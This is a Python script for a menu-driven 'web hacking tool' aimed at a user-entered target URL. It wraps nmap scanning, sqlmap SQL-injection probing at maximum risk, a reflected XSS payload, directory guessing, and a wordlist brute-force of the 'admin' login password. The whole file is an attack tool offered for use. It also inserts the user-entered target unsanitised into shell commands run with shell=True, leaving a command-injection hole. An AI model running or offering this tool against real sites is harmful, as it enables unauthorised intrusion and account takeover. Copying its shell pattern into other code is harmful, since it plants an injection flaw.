import requests
import re
import os
import time
import threading
import subprocess

class WebHacker:
    def __init__(self, target):
        self.target = target
        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"

    def scan_website(self):
        print("Scanning website...")
        try:
            # Use Nmap to scan the website
            nmap_command = f"nmap -sT {self.target}"
            output = subprocess.check_output(nmap_command, shell=True)
            print(output.decode("utf-8"))
        except subprocess.CalledProcessError as e:
            print(f"Error: {e}")

    def sql_injection(self):
        print("SQL Injection...")
        try:
            # Use SQLmap to detect SQL injection vulnerabilities
            sqlmap_command = f"sqlmap -u {self.target}/login.php --forms --risk=3 --level=5"
            output = subprocess.check_output(sqlmap_command, shell=True)
            print(output.decode("utf-8"))
        except subprocess.CalledProcessError as e:
            print(f"Error: {e}")

    def xss(self):
        print("Cross-Site Scripting...")
        try:
            payload = "<script>alert('XSS')</script>"
            url = self.target + "/index.php"
            response = requests.get(url, params={"input": payload})
            if re.search(payload, response.text):
                print("XSS successful!")
            else:
                print("XSS failed.")
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")

    def dir_brute_force(self):
        print("Directory Brute Force...")
        try:
            dir_list = ["index.php", "admin.php", "login.php", "register.php"]
            for dir in dir_list:
                url = self.target + "/" + dir
                response = requests.get(url)
                if response.status_code == 200:
                    print(f"Directory found: {dir}")
                else:
                    print(f"Directory not found: {dir}")
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")

    def password_cracking(self):
        print("Password Cracking...")
        try:
            wordlist = "wordlist.txt"
            if not os.path.exists(wordlist):
                print(f"Error: {wordlist} file not found.")
                return
            with open(wordlist, "r") as f:
                words = f.read().splitlines()
                for word in words:
                    url = self.target + "/login.php"
                    response = requests.post(url, data={"username": "admin", "password": word})
                    if re.search("Login successful", response.text):
                        print(f"Password cracked: {word}")
                        break
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")

    def menu(self):
        print("Web Hacking Tool")
        print("---------------")
        print("1. Web Scanning (Nmap)")
        print("2. SQL Injection (SQLmap)")
        print("3. Cross-Site Scripting")
        print("4. Directory Brute Force")
        print("5. Password Cracking")
        print("6. Exit")
        choice = input("Choose an option: ")
        if choice == "1":
            self.scan_website()
        elif choice == "2":
            self.sql_injection()
        elif choice == "3":
            self.xss()
        elif choice == "4":
            self.dir_brute_force()
        elif choice == "5":
            self.password_cracking()
        elif choice == "6":
            print("Exiting...")
            exit()
        else:
            print("Invalid choice. Please choose a valid option.")

def main():
    target = input("Enter the target URL: ")
    if not target.startswith("http://") and not target.startswith("https://"):
        print("Error: Invalid URL. Please enter a valid URL.")
        return
    hacker = WebHacker(target)
    while True:
        hacker.menu()

if __name__ == "__main__":
    main()